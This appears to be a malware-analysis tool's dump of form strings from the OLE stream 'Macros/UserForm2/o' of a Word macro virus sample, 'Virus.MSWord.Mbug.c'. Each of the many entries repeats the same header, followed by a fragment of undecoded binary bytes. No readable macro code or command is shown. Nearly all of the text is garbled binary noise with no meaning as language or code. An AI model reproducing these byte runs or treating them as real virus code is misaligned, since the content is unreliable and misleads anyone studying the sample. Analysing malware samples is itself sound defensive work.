- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M�S�=�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����g�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~;w���*W�^>x���7��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|��)מsP
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�P79�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�JE�_s���`�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f(ف�MX��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� ∆Y�U���(__4
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���(&7
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Wh�d�x�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
yXY9��։"�5ْK�%�N�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
HQgTRI#a�5(�I�]IS�>���d:��{���Q�gu0�c<"eb����ѝ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ck_ݴ�bH6D
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z&ʧw<�&�g���u�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z\1I�L<��"�{��f�*�u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�O�@�p҇�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5��>�eٔ]=�k�����b/���d�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p9�p�5
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5��>��֊���÷��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:$U�[����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����.ڠP�r�!�1䫯�5��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����a
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0��
i(�\��P*Tl�
0�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	HҪ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/�PB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+��e|q�z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�	@*&��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`��<���+�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3���<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��&�3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]ѱ_
���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� ÿB�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ZRO�(�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ɖf�^�	�A:f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��e�|�\���V���&d��K5���v[�uT���Za���Z頃U6�P�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N=�7�M).�.�j
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y����B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=~ގ�#
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'_Cڹ��fe^�y�������^斨�
9�
��П]�9�X��n{/(^��+�*��\��<�>l����g
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�dAz_�B�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���\j-K����.D
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T��wfz�E���8t��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3�;�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9�U�L�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D��"p
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2JK�3]GL(�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V�|,

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���B�`0�	8̡
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
   333PPPfff�������������fff33̙��33�ff�33
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�ff�������3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�f3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3̙f 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3�̙�P
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f̙
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��fff3�̙��3��f��333
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3��f3f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3���f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f3�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�f3f3�̙3�3f�f3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�3f�f������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�f3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�ff̙
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3̙
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ff��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��3ff���3��f��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3f�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�ff�33f���33�ff�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�ff�������3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�f3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3��f�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3�̙��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f�f3f̙̙3��f��3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3f�f�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3����(
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*\Ȱ�Ç
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#J�H�"��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*j�h�c 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(2�\�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
01�dI3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x
��šHu
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5
1hR�K�6t�t��R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R�z�Ǎ�Y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�̸���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5��-[���>�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l[�g��j�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Zw�[
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�ֽ�5p`�y�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��r�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~\X�d�h�fv<��g�}/��{��\
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(Rk�K;��ɲW�U:3+�ܺ/
���p���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ӵ}����ʓ2�m�)��t{v�<�����Y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C�iݴg�돻�Y�{_����Ǐ����C�G�~��]}
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z�Z~�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��p�	(
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�ն��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N��~!�F�:Q��#��"�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��0j(TW4�x�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!�cW͗�g7TV�g�%�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��d<@�$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���� Bm
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WI�%Z4�চ
